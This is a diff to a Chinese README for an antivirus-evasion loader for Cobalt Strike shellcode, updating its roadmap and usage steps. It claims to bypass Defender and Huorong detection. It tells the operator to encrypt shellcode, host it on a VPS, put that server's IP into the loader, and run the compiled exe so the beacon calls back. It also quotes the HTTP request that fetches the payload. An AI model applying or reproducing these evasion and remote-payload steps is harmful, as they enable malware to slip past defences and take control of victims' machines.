@@ -5,11 +5,14 @@ V1.0: 目前测试可以过Defender/火绒的静杀+动杀,360还没测= =不想
 
 下一步开发计划:
 
-V1.5: 加入C版本CS免杀
+V1.5: 加入C版本CS免杀(已完成)
 
-V1.7:加入Powershell的免杀
+V1.7:加入Powershell的免杀(已完成)
 
-V2.0: 开发出UI界面
+V2.0: ~~开发出UI界面~~
+V2.0: 开发成在线免杀平台(已完成)
+PS: 在实际使用中发现图形化界面不利于和其他工具结合,相比之下命令行的方式更具有扩展性
+PS: 关于自己写的在线免杀平台,暂不考虑开源,主要是觉得目前的技术还比较薄弱,如果有师傅想体验可以联系我
 
 V3.0: 想办法结合更多免杀技术(想去研究下进程注入/文件捆绑,不知道免杀效果怎样)
 
@@ -44,7 +47,8 @@ Powershell: Win10上测试没有问题,也就是ps5.1,更低版本未测试
 3. C版本:
 
    > 1. 按要求填入你自己的Key,shellcdoe长度和shellcode,执行
-   > 2. 将第一行的数字复制进Loader的Base64ShellLen字段中,将第二行生成的加密shellcode保存在payload.txt文件中并将其放在服务器上(如果不叫这名或者不在跟路径,需要自己改`char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";`中的路径)
+   > 2. 将第一行的数字复制进Loader的Base64ShellLen字段中,将第二行生成的加密shellcode保存在payload.txt文件中并将其放在服务器上(~~如果不叫这名或者不在跟路径,需要自己改`char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";`中的路径)
+   > 在path中填入可以访问到payload的路径即可(Ex: /test/payload.txt)
    > 3. 在Loader中填入自己的Key和VPS的IP,编译
    > 4. 执行编译出的exe,CS上线
    
